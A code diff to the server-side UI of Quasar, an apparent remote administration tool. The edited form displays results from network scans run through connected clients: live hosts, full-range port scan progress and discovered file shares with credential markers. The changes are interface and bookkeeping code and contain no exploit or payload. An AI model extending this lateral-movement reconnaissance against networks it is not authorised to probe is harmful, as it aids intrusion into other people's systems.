@@ -44,8 +44,6 @@ namespace Quasar.Server.Forms
         /// </returns>
         public static FrmNetworkMovement CreateNewOrGetExisting(Client client)
         {
-            try
-            {
                 if (OpenedForms.ContainsKey(client))
                 {
                     return OpenedForms[client];
@@ -54,12 +52,6 @@ namespace Quasar.Server.Forms
                 f.Disposed += (sender, args) => OpenedForms.Remove(client);
                 OpenedForms.Add(client, f);
                 return f;
-            }
-            catch (Exception ex)
-            {
-                MessageBox.Show(ex.ToString());
-                return null;
-            }
         }
 
         public FrmNetworkMovement(Client client)
@@ -71,12 +63,12 @@ namespace Quasar.Server.Forms
             InitializeComponent();
 
             cmbInterfaces.DataSource = _interfaceItems;
-            _networkEntities.ListChanged += NetworkEntitiesChanged;
+            _networkEntities.ListChanged += NetworkEntitiesListChanged;
 
             DarkModeManager.ApplyDarkMode(this);
         }
 
-        private void NetworkEntitiesChanged(object sender, ListChangedEventArgs e)
+        private void NetworkEntitiesListChanged(object sender, ListChangedEventArgs e)
         {
             lstNetworkEntities.BeginUpdate();
             lstNetworkEntities.Items.Clear();
@@ -108,17 +100,19 @@ namespace Quasar.Server.Forms
 
         private void NetworkEntitiesChanged(object sender, NetworkScanResponseEventArgs args)
         {
-            MessageBox.Show("Wow, a network scan response!");
-            /*
+            EntityListItem instance = _networkEntities.Where(item => item.address.Address == args.Packet.Address.Address && item.nic.Name == args.Packet.Interface.Name).FirstOrDefault();
             try
             {
-                _networkEntities.Remove(_networkEntities.Where(item => item.address.Address.ToString() == args.Packet.Address.ToString() && item.nic.Name == args.Packet.Interface.Name).FirstOrDefault());
-            }
-            finally
-            {
+                if (instance != null)
+                {
+                    _networkEntities.Remove(instance);
+                }
                 _networkEntities.Add(new EntityListItem { Result = args.Packet.Result, FailureReason = args.Packet.FailureReason, address = args.Packet.Address, nic = args.Packet.Interface });
             }
-            */
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
+            }
         }
 
         private void InterfaceEntitiesChanged(object sender, InterfaceScanResponseEventArgs args)
@@ -144,7 +138,58 @@ namespace Quasar.Server.Forms
         {
             //This technically has a bug where users can start 2 scans, which then fucks the progress view
             //But you only have to fix that if we have some STUPID fucking users.
-            if (args.Packet.Addresses <= 0)
+            if (args.Packet.Address != null && args.Packet.NIC != null)
+            {
+                EntityListItem instance = _networkEntities.Where(item => item.address.Address == args.Packet.Address.Address && item.nic.Name == args.Packet.NIC.Name).FirstOrDefault();
+                if (instance != null)
+                {
+                    int location = _networkEntities.IndexOf(instance);
+                    if (args.Packet.ScanningPorts)
+                    {
+                        _networkEntities[location].ScanningPorts = true;
+                        _networkEntities[location].CurrentPort = args.Packet.CurrentPort;
+                    }
+                    else
+                    {
+                        _networkEntities[location].ScanningPorts = false;
+                        _networkEntities[location].CurrentPort = 0;
+                    }
+                    if (args.Packet.ScanningShares)
+                    {
+                        _networkEntities[location].ScanningShares = true;
+                    }
+                    else
+                    {
+                        _networkEntities[location].ScanningShares = false;
+                    }
+                    ListViewItem item = lstNetworkEntities.Items.Cast<ListViewItem>().FirstOrDefault(s => s.Text == args.Packet.NIC.Name && s.SubItems.Count > 1 && s.SubItems[1].Text == args.Packet.Address.Address);
+                    if (item != null)
+                    {
+                        int listLocation = lstNetworkEntities.Items.IndexOf(item);
+                        bool wasSelected = item.Selected;
+                        if (lstNetworkEntities.InvokeRequired)
+                        {
+                            lstNetworkEntities.BeginInvoke((MethodInvoker)delegate
+                            {
+                                lstNetworkEntities.BeginUpdate();
+                                lstNetworkEntities.Items[listLocation] = instance.toItem();
+                                lstNetworkEntities.RedrawItems(listLocation, listLocation, false);
+                                lstNetworkEntities.Items[listLocation].Selected = wasSelected;
+                                lstNetworkEntities.EndUpdate();
+                            });
+                        }
+                        else
+                        {
+                            lstNetworkEntities.BeginUpdate();
+                            lstNetworkEntities.Items[listLocation] = instance.toItem();
+                            lstNetworkEntities.RedrawItems(listLocation, listLocation, false);
+                            lstNetworkEntities.Items[listLocation].Selected = wasSelected;
+                            lstNetworkEntities.EndUpdate();
+                        }
+                    }
+                }
+            }
+            else if (args.Packet.Addresses <= 0)
             {
                 if (statusStrip.InvokeRequired)
                 {
@@ -160,9 +205,7 @@ namespace Quasar.Server.Forms
             }
             else
             {
-                // Cast one operand to double BEFORE dividing to avoid integer division.
                 double progressPercentage = 100 - (((double)args.Packet.CurrentAddress / args.Packet.Addresses) * 100);
-                // Round to 2 decimal places and format as a string with two decimals.
                 string progressText = Math.Round(progressPercentage, 2).ToString("F2");
 
                 if (statusStrip.InvokeRequired)
@@ -239,6 +282,7 @@ namespace Quasar.Server.Forms
         private void FrmNetworkMovement_FormClosing(object sender, FormClosingEventArgs e)
         {
             UnregisterMessageHandler();
+            _networkEntities.ListChanged -= NetworkEntitiesListChanged;
         }
 
         private void btnInterfaceRefresh_Click(object sender, EventArgs e)
@@ -272,13 +316,50 @@ namespace Quasar.Server.Forms
 
         public string FailureReason { get; set; }
 
+        public bool ScanningPorts { get; set; }
+
+        public bool ScanningShares { get; set; }
+
+        public int CurrentPort { get; set; }
+
         public ListViewItem toItem()
         {
             ListViewItem lvi = new ListViewItem();
             lvi.Text = nic.Name.ToString();
             lvi.SubItems.Add(address.Address.ToString());
-            lvi.SubItems.Add(string.Join(", ", address.Ports));
-            lvi.SubItems.Add(string.Join(", ", address.Shares));
+            if (address.Ports == null || address.Ports.Length < 1)
+            {
+                lvi.SubItems.Add("");
+            }
+            else
+            {
+                lvi.SubItems.Add(string.Join(", ", address.Ports));
+            }
+            if (address.Shares == null || address.Shares.Length < 1)
+            {
+                lvi.SubItems.Add("");
+            }
+            else
+            {
+                List<string> shares = address.Shares.Select(s => $"{s.ShareName} ({(s.RequiresCredentials ? "🔒" : "")})").ToList();
+                lvi.SubItems.Add(string.Join(", ", shares));
+            }
+            if (ScanningPorts || ScanningShares)
+            {
+                if (CurrentPort > 0)
+                {
+                    double percentage = ((double)CurrentPort / 65535) * 100;
+                    lvi.SubItems.Add($"Scanning Ports ({CurrentPort} / 65535)... ({Math.Round(percentage, 2).ToString("F2")}% Completed)");
+                }
+                else if (ScanningShares)
+                {
+                    lvi.SubItems.Add($"Scanning Shares...");
+                }
+            }
+            else
+            {
+                lvi.SubItems.Add("Idle...");
+            }
             return lvi;
         }
 
